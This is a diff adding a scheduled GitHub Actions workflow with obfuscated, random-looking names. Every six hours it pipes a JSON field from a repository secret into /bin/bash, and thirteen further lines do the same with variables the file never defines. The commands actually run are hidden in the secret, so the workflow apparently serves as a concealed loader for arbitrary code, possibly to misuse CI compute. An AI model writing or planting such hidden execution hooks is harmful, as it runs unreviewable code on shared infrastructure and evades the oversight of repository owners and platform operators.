@@ -1,0 +1,31 @@
+name: hezhangke9421
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hezhangke9421
+        env:
+          shoyw798: ${{ secrets.shoyw798 }}
+        run: |
+          echo $shoyw798 | jq -r .wm088 | /bin/bash
+          echo $piiu83 | jq -r .lkcsm37 | /bin/bash
+          echo $oj97 | jq -r .lpvh3888 | /bin/bash
+          echo $jvy8969 | jq -r .ivh650 | /bin/bash
+          echo $ib20 | jq -r .hxime86569 | /bin/bash
+          echo $q36921 | jq -r .fazkg84826 | /bin/bash
+          echo $r2 | jq -r .gpkk605 | /bin/bash
+          echo $sbbtz38631 | jq -r .ss3 | /bin/bash
+          echo $rzr48786 | jq -r .qorzi34 | /bin/bash
+          echo $jrqx403 | jq -r .lr01505 | /bin/bash
+          echo $bck8 | jq -r .mc82300 | /bin/bash
+          echo $dr312 | jq -r .mzp13109 | /bin/bash
+          echo $xvxlg77768 | jq -r .ahbf44721 | /bin/bash
+          echo $ny50580 | jq -r .msxr697 | /bin/bash
+
